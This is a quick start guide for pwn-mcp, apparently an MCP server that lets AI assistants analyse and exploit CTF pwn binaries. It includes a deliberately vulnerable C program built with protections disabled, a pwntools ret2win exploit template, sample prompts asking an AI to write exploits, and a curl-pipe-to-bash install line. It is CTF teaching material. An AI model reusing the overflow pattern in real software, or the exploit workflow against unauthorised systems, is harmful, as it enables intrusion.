# Quick Start Guide

This guide will help you get started with pwn-mcp in 5 minutes.

## Prerequisites

- Linux or WSL2 environment
- Node.js 18+ (will be installed if missing)
- A CTF pwn challenge binary

## Installation

### Option 1: Quick Install (Recommended)

```bash
curl -sSL https://raw.githubusercontent.com/polarisxb/pwn-mcp/main/install.sh | bash
```

### Option 2: Docker

```bash
docker pull ghcr.io/polarisxb/pwn-mcp:latest
docker run -it -v "$PWD:/workspace" ghcr.io/polarisxb/pwn-mcp:latest
```

## Your First Analysis

### 1. Prepare a Test Binary

```bash
# Create a vulnerable test program
cat > vuln.c << 'EOF'
#include <stdio.h>
#include <string.h>

void win() {
    system("/bin/sh");
}

void vuln() {
    char buffer[64];
    printf("Enter input: ");
    gets(buffer);  // Vulnerable!
}

int main() {
    vuln();
    return 0;
}
EOF

# Compile without protections
gcc -fno-stack-protector -no-pie -o vuln vuln.c
```

### 2. Start pwn-mcp Server

```bash
# If installed from source
node ~/.pwn-mcp/packages/mcp-server/dist/server.js

# Or with Docker
docker run -it -v "$PWD:/workspace" ghcr.io/polarisxb/pwn-mcp:latest
```

### 3. Use with Claude/Cursor

Add to your MCP settings:

```json
{
  "mcpServers": {
    "pwn-mcp": {
      "command": "node",
      "args": ["~/.pwn-mcp/packages/mcp-server/dist/server.js"],
      "env": {
        "SAFE_MCP_DEEP_STATIC": "true",
        "SAFE_MCP_GDB_EXEC": "true"
      }
    }
  }
}
```

### 4. Ask the AI

Start a conversation:
- "I have a binary called 'vuln' in my current directory. Can you analyze it and help me exploit it?"
- "What protections does this binary have?"
- "Can you find the offset to control RIP?"
- "Generate an exploit script for this challenge"

## Example Workflow

The AI will guide you through these steps:

1. **Initialize Session**
   ```
   AI: Creating session for target binary...
   Session ID: abc123
   ```

2. **Binary Analysis**
   ```
   AI: Analyzing binary...
   - Architecture: x86_64
   - Protections: NX=No, PIE=No, Canary=No
   - Found vulnerable function: gets()
   ```

3. **Find Offset**
   ```
   AI: Running with cyclic pattern...
   - Crash at: 0x6161616c
   - Offset: 72 bytes
   ```

4. **Generate Exploit**
   ```python
   # Generated template
   from pwn import *
   
   p = process('./vuln')
   
   # TODO: Add your exploit here
   offset = 72
   win_addr = 0x401156  # Address of win()
   
   payload = b'A' * offset
   payload += p64(win_addr)
   
   p.sendline(payload)
   p.interactive()
   ```

## Common Commands

| Task | What to Ask |
|------|-------------|
| Analyze binary | "Analyze this binary and tell me about its protections" |
| Find vulnerabilities | "What vulnerabilities does this binary have?" |
| Calculate offset | "Find the offset to control RIP/EIP" |
| Generate exploit | "Create a pwntools script to exploit this" |
| Export report | "Generate a full report of the analysis" |

## Troubleshooting

### Binary not found
- Ensure the binary path is correct
- Use absolute paths if needed

### Analysis tools not available
- Install rizin: `sudo apt install rizin`
- Install gdb: `sudo apt install gdb`

### Permission denied
- Make binary executable: `chmod +x binary`
- Check file ownership

## Next Steps

- Read the [full documentation](../README.md)
- Try more [examples](./EXAMPLES.md)
- Join our [community](https://github.com/polarisxb/pwn-mcp/discussions)

Happy pwning! 🚀
